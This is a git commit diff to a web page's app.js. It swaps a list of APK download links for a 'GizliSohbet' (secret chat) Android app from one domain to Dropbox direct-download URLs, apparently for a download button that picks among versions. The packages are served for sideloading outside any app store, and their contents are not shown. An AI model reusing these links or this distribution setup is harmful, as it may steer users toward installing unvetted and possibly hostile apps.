80c0b3724fdb7e5fc624f4b533a9eca12dcf6fe3
reiscanreis <reiscanreis6@gmail.com>
2026-01-14 01:35:18 +0300

    Update app.js

--- app.js
+++ app.js
@@ -4,30 +4,30 @@ document.addEventListener("DOMContentLoaded", () => {
   const btn = document.getElementById('download-button');
 
   const apkLinks = [
-"https://kaspergroo.com/GizliSohbetV1.apk",
-"https://kaspergroo.com/GizliSohbetV1.apk",
-"https://kaspergroo.com/GizliSohbetV1.apk",
-"https://kaspergroo.com/GizliSohbetV2.apk",
-"https://kaspergroo.com/GizliSohbetV2.apk",
-"https://kaspergroo.com/GizliSohbetV2.apk",
-"https://kaspergroo.com/GizliSohbetV3.apk",
-"https://kaspergroo.com/GizliSohbetV3.apk",
-"https://kaspergroo.com/GizliSohbetV3.apk",
-"https://kaspergroo.com/GizliSohbetV3.apk",
-"https://kaspergroo.com/GizliSohbetV3.apk",
-"https://kaspergroo.com/GizliSohbetV3.apk",
-"https://kaspergroo.com/GizliSohbetV1.apk",
-"https://kaspergroo.com/GizliSohbetV1.apk",
-"https://kaspergroo.com/GizliSohbetV1.apk",
-"https://kaspergroo.com/GizliSohbetV2.apk",
-"https://kaspergroo.com/GizliSohbetV2.apk",
-"https://kaspergroo.com/GizliSohbetV2.apk",
-"https://kaspergroo.com/GizliSohbetV3.apk",
-"https://kaspergroo.com/GizliSohbetV3.apk",
-"https://kaspergroo.com/GizliSohbetV3.apk",
-"https://kaspergroo.com/GizliSohbetV3.apk",
-"https://kaspergroo.com/GizliSohbetV3.apk",
-"https://kaspergroo.com/GizliSohbetV3.apk"
+"https://www.dropbox.com/scl/fi/ivtds5xjzd728g8ri6nq9/GizliSohbetV1.apk?rlkey=yhxkdd9mxrk8ycswk8gizq0c7&st=21d05zjr&dl=1",
+"https://www.dropbox.com/scl/fi/ivtds5xjzd728g8ri6nq9/GizliSohbetV1.apk?rlkey=yhxkdd9mxrk8ycswk8gizq0c7&st=21d05zjr&dl=1",
+"https://www.dropbox.com/scl/fi/ivtds5xjzd728g8ri6nq9/GizliSohbetV1.apk?rlkey=yhxkdd9mxrk8ycswk8gizq0c7&st=21d05zjr&dl=1",
+"https://www.dropbox.com/scl/fi/ivtds5xjzd728g8ri6nq9/GizliSohbetV1.apk?rlkey=yhxkdd9mxrk8ycswk8gizq0c7&st=21d05zjr&dl=1",
+"https://www.dropbox.com/scl/fi/ivtds5xjzd728g8ri6nq9/GizliSohbetV1.apk?rlkey=yhxkdd9mxrk8ycswk8gizq0c7&st=21d05zjr&dl=1",
+"https://www.dropbox.com/scl/fi/ivtds5xjzd728g8ri6nq9/GizliSohbetV1.apk?rlkey=yhxkdd9mxrk8ycswk8gizq0c7&st=21d05zjr&dl=1",
+"https://www.dropbox.com/scl/fi/ivtds5xjzd728g8ri6nq9/GizliSohbetV1.apk?rlkey=yhxkdd9mxrk8ycswk8gizq0c7&st=21d05zjr&dl=1",
+"https://www.dropbox.com/scl/fi/ivtds5xjzd728g8ri6nq9/GizliSohbetV1.apk?rlkey=yhxkdd9mxrk8ycswk8gizq0c7&st=21d05zjr&dl=1",
+"https://www.dropbox.com/scl/fi/lyrtoksrppqyer68m9gn0/GizliSohbetV2.apk?rlkey=h37hjv112991qprwen4pvij8l&st=iywny4ef&dl=1",
+"https://www.dropbox.com/scl/fi/lyrtoksrppqyer68m9gn0/GizliSohbetV2.apk?rlkey=h37hjv112991qprwen4pvij8l&st=iywny4ef&dl=1",
+"https://www.dropbox.com/scl/fi/lyrtoksrppqyer68m9gn0/GizliSohbetV2.apk?rlkey=h37hjv112991qprwen4pvij8l&st=iywny4ef&dl=1",
+"https://www.dropbox.com/scl/fi/lyrtoksrppqyer68m9gn0/GizliSohbetV2.apk?rlkey=h37hjv112991qprwen4pvij8l&st=iywny4ef&dl=1",
+"https://www.dropbox.com/scl/fi/lyrtoksrppqyer68m9gn0/GizliSohbetV2.apk?rlkey=h37hjv112991qprwen4pvij8l&st=iywny4ef&dl=1",
+"https://www.dropbox.com/scl/fi/lyrtoksrppqyer68m9gn0/GizliSohbetV2.apk?rlkey=h37hjv112991qprwen4pvij8l&st=iywny4ef&dl=1",
+"https://www.dropbox.com/scl/fi/lyrtoksrppqyer68m9gn0/GizliSohbetV2.apk?rlkey=h37hjv112991qprwen4pvij8l&st=iywny4ef&dl=1",
+"https://www.dropbox.com/scl/fi/lyrtoksrppqyer68m9gn0/GizliSohbetV2.apk?rlkey=h37hjv112991qprwen4pvij8l&st=iywny4ef&dl=1",
+"https://www.dropbox.com/scl/fi/ya9j08zu9a1gml3cop64w/GizliSohbetV3.apk?rlkey=ipd7057aoaibzdvqeyj59jgkv&st=spz4bphx&dl=1",
+"https://www.dropbox.com/scl/fi/ya9j08zu9a1gml3cop64w/GizliSohbetV3.apk?rlkey=ipd7057aoaibzdvqeyj59jgkv&st=spz4bphx&dl=1",
+"https://www.dropbox.com/scl/fi/ya9j08zu9a1gml3cop64w/GizliSohbetV3.apk?rlkey=ipd7057aoaibzdvqeyj59jgkv&st=spz4bphx&dl=1",
+"https://www.dropbox.com/scl/fi/ya9j08zu9a1gml3cop64w/GizliSohbetV3.apk?rlkey=ipd7057aoaibzdvqeyj59jgkv&st=spz4bphx&dl=1",
+"https://www.dropbox.com/scl/fi/ya9j08zu9a1gml3cop64w/GizliSohbetV3.apk?rlkey=ipd7057aoaibzdvqeyj59jgkv&st=spz4bphx&dl=1",
+"https://www.dropbox.com/scl/fi/ya9j08zu9a1gml3cop64w/GizliSohbetV3.apk?rlkey=ipd7057aoaibzdvqeyj59jgkv&st=spz4bphx&dl=1",
+"https://www.dropbox.com/scl/fi/ya9j08zu9a1gml3cop64w/GizliSohbetV3.apk?rlkey=ipd7057aoaibzdvqeyj59jgkv&st=spz4bphx&dl=1",
+"https://www.dropbox.com/scl/fi/ya9j08zu9a1gml3cop64w/GizliSohbetV3.apk?rlkey=ipd7057aoaibzdvqeyj59jgkv&st=spz4bphx&dl=1"
   ];
 
   btn.addEventListener('click', () => {
@@ -53,6 +53,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }, 3000);
   });
 });
+
 
 
 
